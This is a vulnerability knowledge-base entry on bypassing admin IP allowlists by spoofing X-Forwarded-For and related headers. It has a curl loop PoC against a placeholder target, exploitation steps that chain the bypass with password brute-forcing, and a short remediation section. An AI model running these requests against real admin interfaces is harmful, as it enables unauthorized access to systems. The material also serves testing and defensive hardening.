---
id: "admin-ip-whitelist-bypass"
title: "Admin IP allowlist bypass (spoofing an internal source with X-Forwarded-For)"
kind: "implementation"
cve: null
related-cves: null
cve-note: "None (implementation flaw)"
severity: "high"
cvss: 8.4
severity-basis: "cvss"
severity-note: null
product: "Custom admin gateway (checks only XFF or the first IP)"
versions: "Any"
ports: "80, 443"
keywords: "allowlist, ip, xff, bypass, admin, internal network"
entry: "403 page + access restricted to 127.0.0.1/internal ranges"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (implementation flaws)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
GET /admin/            → 403 "Internal access only"
GET /admin/ (with XFF) → 200 = bypass possible
```

## Prerequisites

- The backend determines the source solely from request headers or the first IP.

## PoC

```bash
# 1) Try headers individually (most trust only the first XFF value)
for h in 'X-Forwarded-For: 127.0.0.1' 'X-Real-IP: 127.0.0.1' 'X-Forwarded-For: 10.0.0.1' \
         'Client-IP: 127.0.0.1' 'X-Originating-IP: 127.0.0.1' 'Forwarded: for=127.0.0.1'; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -H "$h" 'https://target/admin/')
  echo "$code  $h"
done
# Result: 200/302 to the admin backend = successful bypass

# 2) Spoof multiple values (real IP comes last)
curl -s -o /dev/null -w '%{http_code}\n' \
  -H 'X-Forwarded-For: 127.0.0.1, 203.0.113.9' 'https://target/admin/'
```

## Exploitation Steps

1. First confirm the text explaining the 403 denial;
2. Try each header; after a successful bypass, access the admin login/endpoints directly;
3. Combine with weak passwords (brute forcing only becomes meaningful after bypassing the allowlist);
4. Evidence: compare the response headers for a 403 and a 200.

## Remediation and Mitigation

- Trust only a fixed header written by the reverse proxy and require it to overwrite existing values; use the TCP source IP for internal-network checks; provide a separate internal admin entry point.

## References

- OWASP Access Control; CWE-290.
